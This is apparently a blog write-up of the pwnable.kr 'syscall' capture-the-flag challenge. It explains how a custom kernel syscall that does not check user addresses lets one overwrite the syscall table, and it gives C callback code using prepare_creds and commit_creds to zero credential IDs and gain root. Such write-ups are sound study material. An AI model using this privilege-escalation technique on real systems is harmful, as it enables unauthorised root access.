---
layout: post
title:  "Buggy linux syscall exploitation"
date:   2018-07-19 02:36:41 +0100
categories: jekyll update
---

tags: #pwnable #rookiss #kernel #kernelexploit #syscall #cred

Writeup
=======

pwnable.kr - Rookiss 'syscall' challange.

Download : http://pwnable.kr/bin/syscall.c

ssh syscall@pwnable.kr -p2222 (pw:guest)

Site
----

pwnable.kr


Solution
========


Gist
----

The kernel has a new syscall on syscall number 223 which will convert lower case bytes to upper case.
The systam call defined in syscall.c has a bug! The kernel does not check whether the supplied paramaters are coming from the user address space. (__user attribute is missing from the param declaration.)
Since this kernel remapped the syscall table to be writable we can use this sycall to actually overwrite its syscall entry with a function we supply! The linux kernel does not have a separate user and kernel linear virtual address space for performance reasons. 
When a syscall is being executed the linux kernel is running on behalf of a process. It also has access to the address space of the process! This makes it possible to reference userspace memory.
What this means is that we can install our own syscall by overwriting the syscall entry 223 then calling the syscall 223 again.
At this point we also have access to kernel space obviously so we can use kernel functions (we can look them up from /proc/kallsyms as they are readable without sudo on that machine). 
We simply clone the current credentials then we overwrite the new cred structure with the id 0 (root id) then we install the new credentials. After this we can return from the syscall and we have root privileges!

Plan
----

0) Lookup the addresses of the following kernel symbols (kernel address space layout randomization is turned off on the host):
   You can use: 
   `cat /proc/kallsyms | grep <symbol>`
    - sys_call_table
    - prepare_creds
    - commit_creds
   sys_call_table is where the function pointers to the syscall handlers are stored.
   struct cred* prepare_creds() is a kernel function (linux/kernel/cred.c) to clone the current cred struct.
   int commit_creds(struct cred*) will install the new credentials to the process.

1) Remap our text section to the heap and make it executable. (Actually it is enough to remap the code that will be executed when in kernel mode)

2) Install our userspace callback function into the 223 syscall entry. The entry 223 is unused - this is where the lower_to_upper syscall is stored originally.
    This is done by supplying to the buggy syscall:
        - destination address: 
            sys_call_table + 223*sizeof(void*)
        - source address:
            our remapped callback's address (NOTICE: remap to an address which will result in an address of the callback so that none of the bytes of the address falls into the lowercase value range as the buggy syscall will try to make it uppercase value.)

3) Trigger the syscall 223 again - now are injected callback will be executed. 

4) Now we should have root priviliges and now just simply open and read the /root/flag file.


Callback
--------

On x86 linux kernel uses registers to pass parameters to function if it can so we need to repsect that when using internal kernel functions.
https://kernelnewbies.org/ABI


// Callback to be installed as syscall to change the process credentials    

::
    #define SYS_CALL_TABLE_BASE 0x8000e348       // sys_call_table
    #define CRED_PREPARE_CRED    0x8003f44c      // prepare_creds
    #define CRED_COMMIT_CRED     0x8003f56c      // commit_creds

    typedef void* (*prepare_creds_ty)(void);        // return struct cred*
    typedef __attribute__((regparm(1))) int   (*commit_creds_ty)(void*);        // takes struct cred*

    void* prepare_creds(void)
    {
        return ((prepare_creds_ty)CRED_PREPARE_CRED)();
    }

    __attribute__((regparm(1)))  // regparam (number) => pass <number> params through registers
    int commit_creds(void* cred) 
    {
        return ((commit_creds_ty)CRED_COMMIT_CRED)(cred);
    }

    __attribute__((regparm(1)))
    void setid_on_cred(void* cred)
    {
        u32* pcred = (u32*)cred;
        int  i = 0;
        // now we should try to 'blindly' modify the uids. struct cred is defined in linux/include/cred.h 
        pcred++;                // jump over the 'usage' field
        for(i=0;i<8;i++) {      // we have 8 'id' members in struct cred - overwrite them with 0 (root id)
            *pcred = 0;         // credential zero is the root id
            pcred++;
        }
    }


    int change_cred(char* a, char* b)
    {
        int  res = -1;
        void* cred = prepare_creds();
        if(!cred) {
            return -1;
        }
        setid_on_cred(cred);
        res = commit_creds(cred);
        return res;
    }

Once the syscall returns the second time (the first was to exploit the bug and overwrite the syscall entry) we have root priviliges.
Now we can open and read the /root/flag file contents simply in userspace.

